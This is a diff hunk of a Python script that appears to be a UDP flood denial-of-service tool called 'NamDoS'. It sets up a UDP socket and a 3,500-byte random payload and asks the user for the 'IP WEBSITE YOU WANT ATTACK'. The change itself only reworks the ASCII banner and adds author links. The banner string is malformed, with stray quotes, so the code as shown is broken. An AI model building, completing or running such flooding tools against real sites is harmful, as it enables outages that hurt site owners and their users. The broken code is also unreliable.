@@ -7,17 +7,21 @@ white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(3500)
 
 os.system("clear")
-print "_   _                       _____             _____ 
+def logo():
+  logo = """
+  _   _                       _____             _____ 
  | \ | |                     |  __ \           / ____|
  |  \| |   __ _   _ __ ___   | |  | |   ___   | (___  
  | . ` |  / _` | | '_ ` _ \  | |  | |  / _ \   \___ \ 
  | |\  | | (_| | | | | | | | | |__| | | (_) |  ____) |
  |_| \_|  \__,_| |_| |_| |_| |_____/   \___/  |_____/ "                                                                     "                                                                                                                           "
-print 
-print("\032[32m================================================================\033[0m")
-print("\032[33mGithub 	       : https://github.com/Lozllll/\033[0m")
-print("\032[32m================================================================\033[0m")
-print
+
+============================================================
++Github      : https://github.com/Lozllll
++Facebook    : https://facebook.com/hoangnamtricker.2009
+============================================================
+"""
+  print (logo)
 
 ip = raw_input("[+] >>IP WEBSITE YOU WANT ATTACK: ")
 os.system("clear")
